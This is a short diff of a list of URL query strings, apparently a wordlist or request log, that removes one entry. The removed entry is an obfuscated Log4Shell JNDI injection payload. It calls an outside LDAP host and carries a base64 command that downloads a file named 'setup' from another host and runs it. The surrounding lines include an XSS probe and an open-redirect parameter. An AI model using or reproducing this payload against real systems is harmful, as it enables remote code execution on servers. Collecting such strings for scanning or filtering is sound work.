@@ -623,7 +623,6 @@
 ?s=foo
 ?s={search_term_string}
 ?static=1&order=asc
-?test=t(%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//137.184.40.48:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NldHVwOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc2V0dXA7IGNobW9kIDc3NyBzZXR1cDsgLi9zZXR1cCBleHBsb2l0%7D%27)
 ?wptouch_switch=desktop&redirect=https://127.0.0.1/
 ?wsdl
 ?{alert(1)}
